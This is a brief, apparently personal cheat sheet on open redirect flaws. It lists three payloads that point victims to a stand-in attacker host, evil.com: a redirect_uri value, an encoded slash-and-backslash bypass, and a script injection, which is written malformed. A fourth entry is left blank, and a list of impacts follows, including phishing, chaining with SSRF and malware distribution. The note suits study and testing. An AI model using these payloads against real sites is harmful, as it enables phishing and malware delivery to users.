# open redirect


1 - payload: {evil.com} 
example: site.com/.../redirect_uri=evil.com/...

2 - payload: {///%5Cevil.com/} 
example: site.com///%5Cevil.com/ 

3 - payload:  </script>window.location"http://evil.com"</script>
example: search box : injection

4 - payload:
example:

impact:
- an attacker can do phishing with legitimate users
-  they can also chain this with SSRF
-  reputation loss, money loss
-  malware distribution
- 
